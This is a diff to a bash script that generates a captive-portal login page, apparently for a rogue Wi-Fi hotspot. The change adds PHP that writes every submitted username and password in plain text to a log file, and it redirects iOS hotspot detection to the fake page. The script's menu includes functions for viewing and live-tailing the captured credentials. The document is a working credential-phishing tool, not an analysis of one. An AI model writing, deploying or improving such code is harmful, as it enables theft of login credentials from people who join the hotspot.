@@ -15,27 +15,31 @@ ensure_directories() {
     if [ ! -d "$PORTAL_DIR" ]; then
         echo "[+] Portal folder missing. Creating..."
         mkdir -p "$PORTAL_DIR"
-        echo "[+] Created $PORTAL_DIR"
     fi
 
+    # Create index.php for iOS captive portal
     if [ ! -f "$PORTAL_DIR/index.php" ]; then
-        echo "[+] Creating default index.php for captive portal..."
 cat > "$PORTAL_DIR/index.php" <<EOF
 <?php
-// Apple captive portal detection
+// iOS captive portal detection
 if (\$_SERVER['REQUEST_URI'] == "/hotspot-detect.html") {
     header("Location: /index.php");
     exit;
 }
-// Normal login page
+
+// Handle login submission
+if (\$_SERVER['REQUEST_METHOD'] === 'POST') {
+    \$username = isset(\$_POST['username']) ? \$_POST['username'] : '';
+    \$password = isset(\$_POST['password']) ? \$_POST['password'] : '';
+    file_put_contents('../logs/log.txt', date('Y-m-d H:i:s') . " - USER: \$username PASS: \$password\\n", FILE_APPEND);
+}
 include("index.html");
 ?>
 EOF
-        echo "[+] index.php created"
     fi
 
+    # Create a default login page if missing
     if [ ! -f "$PORTAL_DIR/index.html" ]; then
-        echo "[+] Creating basic index.html..."
 cat > "$PORTAL_DIR/index.html" <<EOF
 <!DOCTYPE html>
 <html>
@@ -52,7 +56,6 @@ cat > "$PORTAL_DIR/index.html" <<EOF
 </body>
 </html>
 EOF
-        echo "[+] index.html created"
     fi
 
     if [ ! -d "logs" ]; then
@@ -160,9 +163,12 @@ view_logs() { cat "$LOG_FILE"; }
 live_logs() { tail -f "$LOG_FILE"; }
 
 # ---------------------------
-# Edit page
+# Edit page (auto-create folder & file if missing)
 # ---------------------------
-edit_page() { nano "$PORTAL_DIR/index.html"; }
+edit_page() {
+    ensure_directories
+    nano "$PORTAL_DIR/index.html"
+}
 
 # ---------------------------
 # Main Menu
